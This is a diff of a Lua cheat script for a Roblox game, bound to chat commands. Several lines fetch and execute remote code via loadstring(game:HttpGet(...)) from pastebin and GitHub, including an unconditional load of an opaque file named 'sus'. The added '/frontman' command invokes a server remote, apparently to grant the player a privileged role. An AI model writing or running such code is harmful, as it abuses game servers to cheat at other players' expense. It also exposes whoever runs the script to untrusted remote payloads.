@@ -58,7 +58,8 @@ game.Players.LocalPlayer.Chatted:connect(function(cht)
 	elseif cht:match("/both") or cht:match("/opengui") then
 	loadstring(game:HttpGet("https://pastebin.com/raw/UXmbai5q", true))()
 	loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
-	
+	elseif cht:match("/frontman") then
+	game.ReplicatedStorage.FrontmanRemotes.BecomeFrontman:InvokeServer(true)
 	elseif cht:match("/iy") then
 	loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
 	elseif cht:match("/shop") then
@@ -71,4 +72,3 @@ game.Players.LocalPlayer.Chatted:connect(function(cht)
 		
 		
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/storematelamo/nto/main/sus'),true))()
-game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Executed In 0.35 Seconds!","all")
